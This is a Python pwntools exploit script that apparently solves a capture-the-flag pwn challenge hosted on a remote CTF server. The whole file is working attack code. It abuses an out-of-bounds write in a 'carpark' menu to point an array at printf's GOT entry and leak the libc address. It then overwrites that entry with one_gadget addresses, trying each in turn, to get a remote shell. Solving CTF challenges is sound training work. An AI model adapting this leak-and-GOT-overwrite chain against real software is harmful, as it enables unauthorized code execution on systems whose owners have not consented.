from pwn import *

# Load ELF and libc
e = ELF('./chall')
libc = ELF('./libc/libc6_2.35-0ubuntu3.8_amd64.so', checksec=False)
# libc = ELF('libc6_2.39-0ubuntu8.4_amd64.so')

# Remote host and port
HOST = 'ico.nusgreyhats.org'
PORT = 33102

# GOT addresses
printf_got = 0x404020

one_gadgets = [965761, 965765, 965768, 965858, 965944, 965951, 965955]

# === Helper Functions ===
def menu(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice).encode())

def change_carpark1(slot, val):
    menu(1)
    p.recvuntil(b'> ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'New value > ')
    p.sendline(str(val).encode())

def change_carpark2(slot, val):
    menu(3)
    p.recvuntil(b'> ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'New value > ')
    p.sendline(str(val).encode())

def view_carpark2(idx):
    menu(4)
    p.sendlineafter(b'> ', str(idx).encode())
    p.recvuntil(f'car {idx} is '.encode())
    return int(p.recvline().strip())

# === Exploit ===
for offset in one_gadgets:
    try:
        print(f'Trying one_gadget offset: {hex(offset)}')
        p = remote(HOST, PORT)
        # p = process('./chall')
        # Step 1: Redirect carpark2 to point to printf@GOT
        change_carpark1(10, printf_got)

        # Step 2: Leak printf address
        leaked_printf = view_carpark2(0)
        log.success(f"Leaked printf@libc: {hex(leaked_printf)}")

        # Step 3: Calculate libc base and one_gadget address
        libc_base = leaked_printf - libc.sym['printf']
        one_gadget_addr = libc_base + offset
        print(f'Libc base: {hex(libc_base)}')
        print(f'One-gadget address: {hex(one_gadget_addr)}')

        # Step 4: Overwrite printf@GOT with one_gadget
        change_carpark2(0, one_gadget_addr)

        # Step 5: Trigger printf (indirectly or via interaction)
        p.interactive()

        # Step 6: Check if connection closed during interactive
        if p.closed:
            log.warning(f"Connection closed with one_gadget {hex(offset)} — trying next...")
            continue

    except Exception as ex:
        print(f'Failed with offset {hex(offset)}: {ex}')
        p.close()
